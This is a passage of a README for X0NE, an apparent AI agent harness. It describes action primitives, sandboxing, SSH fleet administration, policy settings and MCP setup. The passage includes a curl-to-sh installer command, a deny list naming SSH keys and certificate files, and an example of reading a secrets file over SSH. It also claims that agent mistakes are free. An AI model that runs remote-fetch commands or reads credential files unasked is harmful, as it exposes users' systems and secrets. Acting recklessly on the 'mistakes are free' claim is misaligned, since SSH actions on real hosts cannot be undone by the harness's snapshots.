| `SendInput` | Write to stdin of a running streaming process (interactive CLI/REPL) |

### Desktop (requires `desktop.enabled = true`, Sway/Wayland)

`Screenshot` `GetWindowTree` `GetFocusedWindow` `MoveMouse` `Click` `DoubleClick` `Scroll` `TypeText` `PressKey` `PressKeyCombination` `FocusWindow` `SendNotification` `GetClipboard` `SetClipboard`

Requires external Wayland tools:
```bash
sudo apt install grim wlrctl wtype wl-clipboard libnotify-bin
```
See [docs/desktop.md](docs/desktop.md) for full setup and configuration.

### Meta

`ListActions` `DescribeAction` `PolicyCheck` `ReadLogs`

### Artifact, browser-reachable web artifacts

When an agent writes HTML/CSS/JS that a human wants to open, the orchestrator embeds a **loopback reverse-proxy** on `127.0.0.1:7800` to make the artifact reachable at `http://localhost:7800/a/<artifact_id>/`, without opening any port on the network.

| Primitive | Where | Description |
|---|---|---|
| `ArtifactCreate` | x0ne-runtime | Allocate an artifact directory, return `{ artifact_id, root_path, url }` |
| `ArtifactExpose` | **orchestrator** (host) | Register with the local proxy, return the loopback URL |
| `ArtifactUnexpose` | **orchestrator** (host) | Remove an artifact (or all) from the local proxy |
| `ArtifactList` `ArtifactSave` `ArtifactStop` `ArtifactDestroy` `ArtifactServe` | x0ne-runtime | Lifecycle |

```json
// Agent chain: create → write → expose
{"type": "Pipeline", "steps": [
  {"type": "ArtifactCreate", "name": "eth-ticker"},
  {"type": "WriteFile", "path": "{root_path}/index.html", "content": "<!DOCTYPE html>…"},
  {"type": "ArtifactExpose", "artifact_id": "{artifact_id}"}
]}
```

`ArtifactExpose` executes on the host (never inside the sandbox, same pattern as `RunIncus`) and returns a URL the user's browser can actually open. Files are pulled out of the sandbox on-demand via `incus file pull`; no files are copied to the host, no Incus device is created, and the port is `127.0.0.1` only. When `x0ne` exits, the port dies with it. See [x0ne-orchestrator/README.md § Artifact](x0ne-orchestrator/README.md#artifact--browser-reachable-web-artifacts) for details.

### Composite Primitives

Define reusable, parameterized macros from existing primitives. Stored on disk, discoverable via `ListActions`/`DescribeAction`, and executed like native actions.

| Action | Description | Mutable |
|--------|-------------|---------|
| `DefinePrimitive` | Define a composite from a pipeline of existing actions | Yes |
| `CallPrimitive` | Call a defined composite with arguments | Yes |
| `ListCustomPrimitives` | List all user-defined composites | No |
| `DeletePrimitive` | Delete a composite by name | Yes |

Example, define a health check macro:
```json
{"type": "DefinePrimitive", "name": "HealthCheck",
  "params": {
    "url": {"type": "string", "required": true},
    "log_path": {"type": "string", "required": true}
  },
  "steps": [
    {"type": "HttpRequest", "url": "{url}", "method": "HEAD"},
    {"type": "ReadLogs", "path": "{log_path}", "lines": 50}
  ]}
```
Call it: `{"type": "CallPrimitive", "name": "HealthCheck", "args": {"url": "https://api.example.com", "log_path": "/var/log/app.log"}}`

**Security:** No recursion, no self-reference, max depth 3, every step passes through the policy engine. Persisted in `~/.config/x0ne/primitives/`.

### Try / Assert (core primitives)

Transactional execution with automatic snapshot and rollback:

```json
{
  "type": "Try",
  "label": "refactor auth",
  "rollback_on_fail": true,
  "actions": [
    {"type": "WriteFile", "path": "src/auth.rs", "content": "..."},
    {"type": "RunCommand", "command": "cargo", "args": ["check"]}
  ]
}
```
If `cargo check` fails → the file is **automatically restored** from snapshot.

```json
{"type": "Assert", "check": "file_exists", "path": "/tmp/output.txt"}
{"type": "Assert", "check": "eq", "actual": 42, "expected": 42}
```

9 assertion checks: `file_exists`, `file_contains`, `port_open`, `command_succeeds`, `eq`, `gt`, `lt`, `not_empty`, `env_set`.

### Sysaicalls (orchestrator-side)

These meta-actions run in the **orchestrator**, not in x0ne-runtime. They are the control-flow primitives that enable multi-agent coordination:

| Action | Description |
|--------|-------------|
| `Plan` | Label and execute a multi-step plan with progress tracking. |
| `SpawnWorld` | Spawn a sub-agent with its own conversation, LLM context, and x0ne-runtime bridge. |
| `WaitAgent` | Wait for a sub-agent to finish and collect its result + token usage. |
| `ListAgents` | List active sub-agents and their status (running/completed/failed). |
| `BroadcastAgents` | Send a message to all running sub-agents. |
| `Reflect` | Self-evaluation over the conversation context. |

#### Orchestrator-First Dispatch

The orchestrator acts as a **universal action router**. When a `Pipeline` contains any sysaicall (SpawnWorld, WaitAgent, etc.), the orchestrator executes the entire Pipeline locally, routing each step to either local handling or x0ne-runtime's bridge. Pure-system Pipelines still forward to x0ne-runtime directly (zero overhead).

```
Pipeline { SpawnWorld, ReadFile, WaitAgent }
    │
    ├─ step 1: SpawnWorld → orchestrator (tokio::spawn + new bridge)
    ├─ step 2: ReadFile   → x0ne-runtime bridge
    └─ step 3: WaitAgent  → orchestrator (await oneshot)
```

This enables the LLM to compose sysaicalls with system actions in a single Pipeline, the key unlock for multi-agent workflows.

### Parallel Worlds

> **The LLM thinks in branches, not sequences.**

X0NE supports **three levels of parallelism**, orchestrator-level (multi-agent), Podman containers (OCI), and Incus containers (LXC). They can run simultaneously and be combined.

#### Level 1, Multi-agent (orchestrator)

Spawn N sub-agents, each with its own conversation context, LLM loop, and x0ne-runtime bridge. Each agent runs independently and can execute any action. Results are collected via `WaitAgent`.

```json
{"type": "Pipeline", "steps": [
  {"type": "SpawnWorld", "id": "ui",      "task": "Design a TUI dashboard for BTC price"},
  {"type": "SpawnWorld", "id": "api",     "task": "Implement CoinGecko API client in Rust"},
  {"type": "SpawnWorld", "id": "tests",   "task": "Write integration tests for the ticker"},
  {"type": "SpawnWorld", "id": "docs",    "task": "Write README and usage docs"},
  {"type": "WaitAgent",  "id": "ui",      "timeout_secs": 120},
  {"type": "WaitAgent",  "id": "api",     "timeout_secs": 120},
  {"type": "WaitAgent",  "id": "tests",   "timeout_secs": 120},
  {"type": "WaitAgent",  "id": "docs",    "timeout_secs": 120}
]}
```

**Safety boundaries:**
- Sub-agents **cannot spawn further agents** (prevents recursive agent soup)
- Each sub-agent has its own action budget (`X0NE_SERVE_SUB_AGENT_MAX_ACTIONS`, default: 10)
- Interrupt propagation: Ctrl+C stops all Pipeline steps

#### Level 2, Podman containers (OCI, Linux + macOS)

`RunInSandbox` runs a single ephemeral Podman container. `RunContainerGroup` runs N containers in parallel with semaphore-limited concurrency. Both are daemonless and rootless.

```json
{"type": "RunContainerGroup", "tasks": [
  {"id": "py-test",  "image": "python:3.12-slim", "command": ["python", "-m", "pytest"]},
  {"id": "lint",     "image": "node:20-slim",      "command": ["npx", "eslint", "."]},
  {"id": "build",    "image": "alpine",            "command": ["make", "release"]}
], "memory_mb": 256, "timeout_secs": 60}
```

```
Sequential (slow):   test → lint → build                        (3 round-trips)
Parallel   (fast):   RunContainerGroup [test, lint, build]      (1 round-trip)
```

#### Level 3, Incus containers (LXC, Linux only)

When `RunIncus` / `RunIncusGroup` are enabled (requires an Incus remote), agents can **fork N isolated containers simultaneously**, each exploring a different approach, then pick the winner in a single round-trip.

```
Sequential (slow):   try A → fail → try B → fail → try C → ok   (3 round-trips)
Parallel   (fast):   RunIncusGroup [A, B, C] → pick winner       (1 round-trip)
```

| Primitive | What it does |
|-----------|-------------|
| `RunIncus` | Single ephemeral LXC container, inject files, run, collect output, auto-delete |
| `RunIncusGroup` | N containers in parallel, same btrfs snapshot, different commands |
| `base_snapshot` | CoW clone in **< 200ms**, all worlds start from the same frozen state |
| `snapshot_on_exit` | Save container state as a rollback point before a risky operation |

**Measured on prod-infra (btrfs):** 4 parallel containers → 5.6s total · CoW clone < 200ms · zero zombie containers.

#### Combining all three levels

A parent agent can spawn sub-agents that each use Podman or Incus containers internally:

```
Parent LLM
├─ SpawnWorld "frontend"  → sub-agent uses RunInSandbox (Podman) to test in Alpine
├─ SpawnWorld "backend"   → sub-agent uses RunIncus to test in Ubuntu (full system)
├─ SpawnWorld "benchmarks"→ sub-agent uses RunContainerGroup [4 Podman variants]
├─ SpawnWorld "variants"  → sub-agent uses RunIncusGroup [4 Incus variants, btrfs CoW]
└─ WaitAgent all          → collect results, pick winner
```

#### Sandbox mode (`make run-incus-runtime`)

Even when x0ne-runtime runs inside a sandbox container, Parallel Worlds still work. The orchestrator maintains a **secondary host-side bridge**, a local x0ne-runtime instance with access to the `incus` CLI. When RunIncus/RunIncusGroup are detected, they are routed to this host-side bridge instead of the sandbox:

```
Orchestrator (host)
├── Primary bridge ──→ sandbox container (ReadFile, WriteFile, RunCommand…)
│                        ↑ winning solution applied here
└── Incus bridge ────→ local x0ne-runtime → incus launch → ephemeral containers
                         (RunIncus, RunIncusGroup)
```

This means `make run-incus-runtime` gives you **full isolation** (agent actions in the sandbox) AND **parallel worlds** (Incus containers on the remote), no nested containers needed.

#### Time Travel, snapshot & rollback

Incus containers on btrfs are **time machines**. Every container state can be frozen and restored in milliseconds thanks to Copy-on-Write snapshots:

```
Agent explores risky refactor
  ├─ snapshot_before: "pre-refactor"     ← frozen state (< 200ms, zero-copy)
  ├─ writes 12 files, runs tests         ← fails
  ├─ RestoreSnapshot "pre-refactor"      ← instant rollback
  └─ tries a different approach          ← clean slate, same starting point
```

| Capability | How |
|------------|-----|
| **Checkpoint before risk** | `base_snapshot` / `snapshot_before` on any `RunIncus` or `Pipeline` |
| **Instant rollback** | `RestoreSnapshot`, btrfs reflink, < 200ms regardless of container size |
| **Branch & compare** | `RunIncusGroup` forks N CoW clones from the same snapshot, each explores a different strategy, agent picks the winner |
| **Survive catastrophic failure** | Container deleted on exit (`--ephemeral`), host is never touched |


The LLM doesn't need to be careful, it can explore aggressively, knowing that any checkpoint is a free undo. This is the key difference from bare-metal agents: **mistakes are free**.

→ Full Incus setup and architecture: [Parallel Worlds & Snapshot Architecture](#parallel-worlds--snapshot-architecture)

---

### Multimodal

X0NE is not text-only, agents can **see**, **listen**, and **delegate to specialized models**.

#### Vision pipeline

When the agent takes a `Screenshot`, the image is injected directly into the conversation as a base64-encoded attachment. All three backends handle it natively:

| Backend | Format |
|---------|--------|
| **Anthropic** (Claude) | Multi-part content blocks: `[{type:"text"}, {type:"image", source:{type:"base64", ...}}]` |
| **Ollama** (llava, bakllava) | `images: [base64...]` array on the user message |
| **OpenAI-compat** (GPT-4o, etc.) | `content: [{type:"text"}, {type:"image_url", image_url:{url:"data:..."}}]` |

The LLM literally sees the screenshot, no OCR, no description intermediary.

#### Multi-model pipeline

Different models excel at different tasks. Chain them in a single `Pipeline`:

```json
{
  "type": "Pipeline",
  "steps": [
    {"type": "Screenshot"},
    {"type": "OllamaChat", "endpoint": "http://localhost:11434", "model": "llava",
     "messages": [{"role": "user", "content": "Describe this UI", "images": ["<base64>"]}]},
    {"type": "LlmCall", "endpoint": "http://localhost:11434", "model": "codellama",
     "prompt": "Fix the CSS issue described above"}
  ]
}
```

`OllamaChat` supports full multi-turn conversations with optional per-message image attachments, ideal for vision models that need follow-up questions.

#### Document extraction

`DocumentExtract` handles PDF → text (pdftotext), video → transcription (whisper), image → OCR (tesseract), and can optionally convert the output to a JSONL training dataset via an LLM.

---

## Fleet admin from the CLI

Two complementary modes. The same agent (Claude Code, Codex, or `x0ne` itself) can use both, choosing per-host.

### Mode "adhoc" — `SshExec` typed primitive

Zero install on the target. Just `ssh user@host -- cmd` typed:

```jsonc
{ "type": "SshExec",
  "host": "user@hv-example-01",
  "command": "virsh",
  "args": ["list", "--all"],
  "timeout_secs": 10 }
// returns: { command, args, exit_code, stdout, stderr, timed_out }
```

- Inherits your `~/.ssh/config` — ProxyJump, IdentityFile, etc. work.
- `BatchMode=yes` and `StrictHostKeyChecking=accept-new` forced by default (no interactive deadlock; first connection auto-trusts host key).
- Shell metacharacters in `command` rejected (use `command:"sh", args:["-c","<pipeline>"]` for pipes).
- **Default-deny in policy** — opt in via `[actions] SshExec = true` or per-host gate (planned: `confirm` for prod tags).

### Mode "native" — deploy `x0ne-runtime` on the host

Same wire format, but every action lands typed + policy-checked + audited **on the remote box**. If your laptop is compromised, the remote runtime still refuses anything outside its local policy. Defense in depth.

```bash
# Build a glibc-2.35 musl-static binary and push to the host
make sync-incus-musl     # in-cluster Incus example
# Or for a real bare-metal target — see `make deploy-runtime` (coming next iteration)
```

The orchestrator routes via `bridge.mode = "sandbox"` with `sandbox_cmd = "ssh <target> -- /opt/x0ne-runtime --mode mcp"`. From there, every primitive (Read*, Git*, RunCommand whitelist, snapshots, Try blocks, the works) executes inside the host's policy.

### Host inventory — `~/.x0ne/hosts.toml`

```toml
[[hosts]]
name = "hv-example-01"
target = "root@192.0.2.13"
mode = "native"                       # adhoc | native
runtime_path = "/opt/x0ne-runtime"
policy_profile = "readonly"           # template kept on the host
tags = ["hypervisor", "libvirt", "dc1"]
description = "DC1 hypervisor, KVM/QEMU, ZFS pool tank"

[[hosts]]
name = "vm-api-01"
target = "user@192.0.2.42"
mode = "adhoc"
tags = ["api", "dc1", "vm"]
ssh_options = ["ProxyJump=hv-example-01"]
```

Six native MCP tools manage it (visible to Claude Code as `mcp__x0ne-gateway__x0ne_host_*`):

- `x0ne_host_list [tag]` — list all (filter by tag)
- `x0ne_host_get name` — full record
- `x0ne_host_add { name, target, mode, tags, ... }` — upsert
- `x0ne_host_remove name` — drop entry, clear active pointer if needed
- `x0ne_host_use [name]` — set/clear active host
- `x0ne_host_active` — current active host

### Persistent SSH multiplexing — `make setup-ssh-aliases`

```bash
make setup-ssh-aliases
```

Writes `~/.ssh/config.d/x0ne.conf`:

```
Host *
    ControlMaster auto
    ControlPath ~/.ssh/x0ne-cm/%C
    ControlPersist 30m
    ServerAliveInterval 30
```

First SSH to a host authenticates; subsequent invocations (other terminals, follow-up `SshExec` actions) reuse the same TCP+TLS session. **Reconnects to fleet hosts become instant.** Auto-add of `Include config.d/*.conf` to `~/.ssh/config` if missing.

### Recommended workflow with Claude Code

1. `make claude-add` — registers `x0ne` (runtime) + `x0ne-gateway` (orchestrator) MCP servers in Claude Code's config.
2. `make setup-ssh-aliases` — opt into persistent SSH multiplexing.
3. In Claude Code, ask: *"register hv-example-01 as a native host on root@192.0.2.13, then list its VMs"*. Claude calls `x0ne_host_add` then `ssh_exec virsh list --all`.
4. Every action is logged to `~/.x0ne/sessions/<ts>.jsonl` — full audit trail of every command, exit code, and output, ready to grep.

### Threat model — what X0NE does NOT do

- Does not store SSH credentials. `~/.ssh/` and your agent (gpg-agent / yubikey / 1password) own that.
- Does not bypass `~/.ssh/known_hosts` checks. `accept-new` mode means: first connection trusts, subsequent ones must match. Tamper triggers a hard fail.
- Does not log secrets. Stdout/stderr from `SshExec` IS logged — if you `cat /etc/x0ne/.env` over SSH, that's in your session.jsonl. Treat sessions as `chmod 600 you-only`.

---

## Agent-extensible primitives — scripted functions

The agent doesn't only consume primitives. It can **mint its own**. Every session can permanently grow X0NE's standard library with small typed callable functions.

```jsonc
// 1. Agent emits this once. Validates, persists to ~/.x0ne/functions/registry.json.
{
  "type": "DefineFunction",
  "name": "slugify",
  "description": "lowercase + replace whitespace with dashes",
  "source": "fn run(s) { let t = s.to_lower(); t.replace(\" \", \"-\"); t }",
  "params": ["s"],
  "returns": "string"
}

// 2. From now on (this session, the next, every other agent), call as a primitive:
{ "type": "CallFunction", "name": "slugify", "args": ["Hello X0NE World"] }
//          → "hello-x0ne-world"   (returned in ~500µs)
```

**Why this is different from a Python service**

| | Python "tool" service | **Scripted function (Rhai)** |
|---|---|---|
| Cold start | 100–1000 ms | **0.5 ms** |
| Footprint | 50–500 MB process | **<1 MB engine, 0 KB per function** |
| Sandboxing | container-level | **bytecode + capability** (no FS / net / clock unless host registers them) |
| Deterministic | ❌ | **✅** (identical input → identical output, no side channels) |
| Persistence | container lifetime | **`~/.x0ne/functions/<name>` keyed by SHA-256 of source** |
| MCP exposure | manual wrap | **automatic** (`x0ne_call_<name>` in `tools/list`) |

**Tier 1 (`tier: "rhai"`, default)** — what's shipping today. Pure functions, op-budget capped (5M ops ≈ 100ms of arithmetic), recursion capped at 64. The script must define `fn run(<params>)` at the top level. JSON ↔ Rhai conversion is total: strings, numbers, booleans, arrays, objects all round-trip; `null` ↔ `()` (Unit).

**Tier 2 (`tier: "wasm"`)** — reserved. Same shape, Wasmtime engine, agent ships a pre-compiled `.wasm` module for compute-heavy work. Lands in a follow-up commit.

**MCP gateway promotion**

Once a function is defined, the orchestrator's MCP gateway exposes it as `x0ne_call_<name>` in `tools/list` so other agents (Claude Code, Codex, sibling X0NE sessions, anything MCP-aware) call it as if it were a built-in. Agent A invents `levenshtein_ratio`, agent B uses it. Compounding stdlib.

**Rhai gotchas worth knowing** (the system prompt nudges the LLM about these — pinned by tests in `x0ne-runtime/src/scripted.rs`):

- `String.replace(...)` mutates in place and returns Unit. Pattern: `let t = s.to_lower(); t.replace(" ", "-"); t`.
- `arr.len`, `s.len` are properties (no parentheses).
- No `eval`, no `import`, no `Engine::file*` — pure function only by design.

**Control-plane MCP tools** (`define_function` / `call_function` / `list_functions` / `delete_function`) are enabled by default since the engine is its own sandbox. Disable in `[actions]` if you want a strict whitelist runtime.

```bash
x0ne_call_function name=slugify args='["My Title"]'
# {"name":"slugify","value":"my-title","duration_us":540}

x0ne_list_functions
# {"count":3,"functions":[{"name":"slugify",…},{"name":"levenshtein_ratio",…},…]}
```

10 end-to-end scenarios in `x0ne-runtime/tests/scenarios/scripted_functions.json` and 13 unit tests in `src/scripted.rs` cover round-tripping, op-cap enforcement, and registry persistence.

---

## Training your own X0NE LLM

> 📘 **Specific recipes:** see [`docs/training.md`](docs/training.md) for the concrete axolotl/unsloth configs, GGUF conversion, ollama redeployment, eval comparisons, and troubleshooting.

Every X0NE session is automatically logged at `~/.x0ne/sessions/<ts>.jsonl` as a typed trajectory: user goal, every typed action emitted by the LLM, every typed result. **That's a clean RAG / SFT / DPO / fine-tuning corpus growing every time you use the tool.**

Six bricks turn that into a path to your own X0NE-native model. All ship today; each is independently usable.

```
brick 1 ── trajectory extractor   ──►  ~/.x0ne/dataset/trajectories.jsonl
brick 2 ── RAG index + x0ne_recipe ──► ~/.x0ne/dataset/index.jsonl + MCP tool
brick 3 ── action schema + GBNF    ──► ~/.x0ne/dataset/action_schema.json + .gbnf
brick 4 ── SFT/DPO export          ──► sft_v1.jsonl + dpo_v1.jsonl  (LoRA-ready)
brick 5 ── eval harness            ──► reproducible baseline per model
brick 6 ── incremental refresh     ──► one-shot `make dataset-refresh`
```

### Today: zero training, RAG + constrained generation

```bash
make dataset           # extract trajectories.jsonl from ~/.x0ne/sessions/
make dataset-index     # TF-IDF index (auto-upgrades to ollama embeddings if nomic-embed-text is pulled)
make dataset-query Q="make me a fun website"   # smoke retrieval
make export-schema     # action_schema.json + action.gbnf
```

The new MCP tool **`x0ne_recipe(intent, k)`** is now exposed via the gateway — every Claude Code / Codex / Cursor session can ask "have I done something like this before?" and get back top-K past Pipelines as few-shot. Combined with `action.gbnf` (`llama-cli --grammar-file`), any open-weight 7B locally outputs only valid X0NE JSON — zero hallucinated tool names.

### LoRA fine-tune (3-6 months window, ~200€ compute)

```bash
make dataset-sft   # ~/.x0ne/dataset/sft_v1.jsonl   — ChatML pairs (system+user+assistant)
make dataset-dpo   # ~/.x0ne/dataset/dpo_v1.jsonl   — auto-mined preference pairs (chosen=success retry, rejected=initial fail)
```

Both files are drop-in for [axolotl](https://github.com/axolotl-ai-cloud/axolotl), [unsloth](https://github.com/unslothai/unsloth), [TRL](https://github.com/huggingface/trl). Recipe sketch:

```yaml
# axolotl config
base_model: Qwen/Qwen2.5-7B-Instruct
chat_template: chatml
datasets:
  - path: ~/.x0ne/dataset/sft_v1.jsonl
    type: chat_template
adapter: lora
lora_r: 16
lora_alpha: 32
lora_target_modules: [q_proj, k_proj, v_proj, o_proj]
```

Then evaluate the result:

```bash
make eval MODEL=ollama/gemma4:31b              # baseline (vanilla)
make eval MODEL=ollama/x0ne-qwen2.5-lora-v1    # post-LoRA — should beat baseline
make eval MODEL=... LOSS=1                     # also estimate per-token cost via ollama
```

Reports `schema_valid_rate` (does the model emit JSON that parses against `action_schema.json`?) + `action_known_rate` (does it use real MCP-registry types vs hallucinated names?) + an optional `loss_estimate` per row.

### Continued pretraining (12-month horizon)

When the corpus crosses 5-10k high-quality trajectories (every session you run grows it incrementally — `make dataset-refresh` after the fact), continued-pretraining a 3B base (Phi-4-mini, Qwen2.5-3B) on `trajectories.jsonl` + `~/.x0ne/sessions/` raw + the X0NE codebase itself yields a **vertical-specialized model** that natively thinks in typed actions. Smaller, faster, and locally on your hardware — irreplaceable on your domain.

### The data flywheel

```
x0ne session ──► ~/.x0ne/sessions/<ts>.jsonl ──► make dataset-refresh ──┐
                                                                         │
                                                ┌────────────────────────┘
                                                ▼
                                      trajectories + index + sft + dpo + schema
                                                │
                                  ┌─────────────┼─────────────┐
                                  ▼             ▼             ▼
                              RAG today   LoRA next month   Pretrain Q4
```

Privacy: everything stays in `~/.x0ne/` on your machine. No telemetry, no cloud upload. The dataset is yours; the model trained on it is yours.

---

## Policy

```toml
[policy]
default_effect = "deny"          # deny | allow
allowed_read_paths  = ["/home/user/code"]
allowed_write_paths = ["/home/user/code"]
allowed_commands    = ["git", "cargo", "npm", "make"]
deny_path_patterns  = ["**/.ssh/**", "**/*.key", "**/*.pem"]
readable_env_vars   = ["PATH", "HOME", "USER"]

[actions]
WriteFile  = false
RunCommand = false
# etc, per-action switches
```

---

## Safety Rails

The orchestrator prevents LLMs from getting stuck in infinite retry loops:

| Protection | Threshold | Behavior |
|---|---|---|
| **Consecutive action limit** | 20 actions | Forces pause, asks LLM to summarize and wait for user |
| **Same-action failure** | 3 identical parse errors | **Breaks** the loop (not retry), suggests `DescribeAction` |
| **Total failure budget** | 8 errors per turn | Hard stop regardless of action type |
| **Repeated-action circuit breaker** | 5 identical failures (`type` + `args` + `error_code`) | Pre-dispatch refusal with `loop_detected` envelope (CLI + TUI) |
| **Parse retry limit** | 3 invalid JSON blocks | Returns to user prompt |
| **Structural hints** | On "missing field" errors | Detects `"params"` wrapper mistakes, injects correction |
| **Schema hints** | On any parse error | Injects correct schema + example from discovered actions |
| **Confirmation gate** | Destructive actions | `[y]es [n]o [a]lways` prompt before writes/commands |

---

## Session Audit Logging

Every session is automatically logged to `~/.x0ne/sessions/*.jsonl`, one JSONL file per invocation. Each line is a self-contained JSON event:

| Event Type | Description |
|------------|-------------|
| `session_start` | Model, version, hostname, PID, correlates audit trails |
| `user_input` | User prompt text |
| `llm_response` | Full LLM response with token counts (in/out) |
| `action` | Action JSON with type, success flag, duration |
| `action_result` | Full result payload (output, errors) |
| `policy_denial` | Action blocked by policy engine (with reason) |

```bash
# View latest session log
cat ~/.x0ne/sessions/$(ls -t ~/.x0ne/sessions/ | head -1) | jq .

# Export conversation as JSON (for LLM fine-tuning)
/export my-training-data    # → ~/.x0ne/exports/my-training-data_2026-04-16_02-30.json
```

The `/export` format produces clean `{"role": "user/assistant", "content": "..."}` pairs, directly compatible with LLM fine-tuning pipelines.

---

## Execution Target Display

The status bar shows exactly where actions execute:

| Icon | Mode | Example |
|------|------|---------|
| 🛡 **sandbox** (green) | Incus/LXC container | `🛡 sandbox x0ne-sandbox` |
| ⚡ **local** (blue) | Direct on host | `⚡ local hp` |
| 🌐 **remote** (yellow) | HTTP API server | `🌐 remote 192.0.2.50:3100` |

Container name is auto-extracted from the `sandbox_cmd` (detects `incus exec <name>`, `ssh <host>`).

---

## Turn Collapse

Previous conversation turns auto-collapse when you send a new prompt:

```
  ▸ I've listed the project root and found 31 entries...   ← previous turn (collapsed)
  
  ▸ read · ListDir                                         ← current action (collapsed)
  ╭─ response ──────────────────────                       ← current response (expanded)
  │ The system is running Ubuntu 22.04...
  ╰─────────────────────────────────────
```

Within a turn, action blocks collapse when the next action or response arrives. Between turns, the entire previous output collapses into a one-line summary. Use `/history` to expand everything.

---

## Security Hardening

| Protection | Description |
|------------|-------------|
| **Path canonicalization** | All file paths resolved via `std::fs::canonicalize()`, blocks `../` traversal and symlink escapes |
| **UTF-8 safe truncation** | Character-based slicing prevents panics on multi-byte sequences |
| **I/O deadlock prevention** | Concurrent `tokio::join!` for stdout/stderr pipes instead of sequential reads |
| **Policy denial audit** | Every blocked action logged with reason to session JSONL |
| **Sandbox file integrity** | Rejects absolute paths and `..` components in sandbox temp directories |

---

## Install

Linux (x86_64, aarch64, static binaries) and macOS (Apple silicon, Intel):

```bash
curl -fsSL https://raw.githubusercontent.com/x0ne-labs/x0ne-Harness/main/install.sh | sh
```

### Verify before you run it

A pipe into `sh` runs whatever the server sends. To read the script first:

```bash
curl -fsSLO https://raw.githubusercontent.com/x0ne-labs/x0ne-Harness/main/install.sh
less install.sh                                    # read it
sh install.sh                                      # then run it
```

What the script does, and nothing else:

- downloads `x0ne-<target>.tar.gz` and `SHA256SUMS` from the release
  (`X0NE_VERSION=v0.2.0` pins a version; default: the latest release);
- refuses to install if the archive is missing from `SHA256SUMS` or its
  SHA-256 differs;
- if the GitHub CLI is installed and logged in, runs
  `gh attestation verify` and refuses on failure; otherwise prints the command;
- copies `x0ne`, `x0ne-runtime` and `x0ne-orchestrator` to `~/.local/bin`
  (`X0NE_INSTALL_DIR` to change it), and sample configs to `~/.config/x0ne`
  only if absent. No `sudo`; no shell file is edited.

`sh install.sh --uninstall` removes the three binaries and keeps your configuration.

To verify a release by hand:

```bash
gh release download v0.2.0 --repo x0ne-labs/x0ne-Harness \
  --pattern 'x0ne-x86_64-unknown-linux-musl.tar.gz' --pattern SHA256SUMS
sha256sum --ignore-missing -c SHA256SUMS
gh attestation verify x0ne-x86_64-unknown-linux-musl.tar.gz --repo x0ne-labs/x0ne-Harness
```

Release assets (stable names): `x0ne-x86_64-unknown-linux-musl.tar.gz`,
`x0ne-aarch64-unknown-linux-musl.tar.gz`, `x0ne-x86_64-apple-darwin.tar.gz`,
`x0ne-aarch64-apple-darwin.tar.gz`, `SHA256SUMS`, and the CycloneDX SBOMs
`x0ne-code.cdx.json`, `x0ne-runtime.cdx.json`, `x0ne-orchestrator.cdx.json`.

From source (no crate is published on crates.io):

```bash
git clone https://github.com/x0ne-labs/x0ne-Harness && cd x0ne-Harness
make install   # builds release + installs to ~/.cargo/bin
```

### Providers, F4 / F5 / F6 in the TUI

Configure in `x0ne-orchestrator.toml`:

```toml
[llm]
provider = "ollama"  # ollama | anthropic | openai-compat

[llm.ollama]
endpoint = "http://localhost:11434"
model    = "mistral"

[llm.anthropic]
model = "claude-sonnet-4-20250514"

[llm.openai_compat]
base_url = "https://api.openai.com"
model    = "gpt-4o"
```

Env vars (`.env`):
```
OLLAMA_BASE_URL=http://localhost:11434
OLLAMA_API_KEY=...
ANTHROPIC_API_KEY=...
X0NE_OPENAI_COMPAT_KEY=...
```

---

## MCP, use with Claude, Codex, Cursor, OpenCode, Zed…

X0NE exposes all 100 runtime actions + 14 orchestrator tools as [MCP](https://modelcontextprotocol.io) tools. Two modes are supported, depending on what you want from the host agent:

| Mode | Binary | What you get |
|------|--------|--------------|
| **Runtime-only** (simplest) | `x0ne-runtime --mode mcp` | 100 typed runtime tools, policy-gated. No agent loop, no sysaicalls. |
| **Orchestrator gateway** (recommended) | `x0ne-orchestrator --mode mcp` | Same primitives **plus** 14 native sysaicalls (`x0ne_plan`, `x0ne_plan_execute`, `x0ne_simulate`, `x0ne_goal_set / step / status / pause / resume / complete / clear`, `x0ne_artifact_expose / unexpose`, `x0ne_list_agents`, `x0ne_orchestrator_info`). The orchestrator spawns a downstream `x0ne-runtime` and proxies unknown tools — one MCP plug, the host agent gets both layers. |

The shared wire-level plumbing (JSON-RPC 2.0, line-delimited stdio, downstream `ChildMcpClient`) lives in the **`x0ne-mcp`** crate so both servers, and any future meta-MCP gateway, speak the same dialect.

> **Two naming conventions, by design.** The agent-loop wire format (LLM → orchestrator → runtime) uses PascalCase action types, `{"type": "CreateSnapshot"}`, because that's the natural Rust enum form and it's what the system prompt teaches. The MCP wire format uses snake_case tool names, `{"name": "create_snapshot"}`, because that's the convention every MCP host agent expects (Claude Desktop, Cursor, Zed, …). Each audience sees an internally consistent dialect; the mapping lives in `x0ne-runtime/src/mcp/registry.rs`.

x0ne-runtime implements the full MCP specification (2024-11-05):
- ✅ `tools/list`, `tools/call` with typed JSON Schema per tool
- ✅ `initialize` / `initialized` lifecycle
- ✅ `resources/list`, `prompts/list` (empty, spec-compliant stubs)
- ✅ `ping`, `logging/setLevel`
- ✅ Notifications handled gracefully (no crash on `notifications/cancelled`)
- ✅ `isError: true/false` on every tool result
- ✅ Full policy engine on every tool call

### Claude Desktop

`~/.config/Claude/claude_desktop_config.json`:
```json
{
  "mcpServers": {
    "x0ne": {
      "command": "x0ne-runtime",
      "args": ["--mode", "mcp"],
      "env": { "X0NE_LOG": "warn" }
    }
  }
}
```

### Claude Code (CLI)

```bash
claude mcp add x0ne -- x0ne-runtime --mode mcp
```

Or manually in `~/.claude.json`:
```json
{
  "mcpServers": {
    "x0ne": {
      "command": "x0ne-runtime",
      "args": ["--mode", "mcp"],
      "env": { "X0NE_LOG": "warn" }
    }
  }
}
```

### Cursor

`.cursor/mcp.json` (per-project) or global MCP settings:
```json
{
  "mcpServers": {
    "x0ne": {
      "command": "x0ne-runtime",
      "args": ["--mode", "mcp"]
    }
  }
}
```

### OpenCode

`opencode.json` in your project root:
```json
{
  "mcp": {
    "x0ne": {
      "type": "stdio",
      "command": "x0ne-runtime",
      "args": ["--mode", "mcp"]
    }
  }
}
```

### Continue.dev

`~/.continue/config.json`:
```json
{
  "mcpServers": [{
    "name": "x0ne",
    "command": "x0ne-runtime",
    "args": ["--mode", "mcp"]
  }]
}
```

### Zed

`settings.json`:
```json
{
  "context_servers": {
    "x0ne": {
      "command": { "path": "x0ne-runtime", "args": ["--mode", "mcp"] }
    }
  }
}
```

### Windsurf

Add via Cascade MCP settings:
```json
{
  "mcpServers": {
    "x0ne": {
      "command": "x0ne-runtime",
      "args": ["--mode", "mcp"]
    }
  }
}
```

### Any MCP client

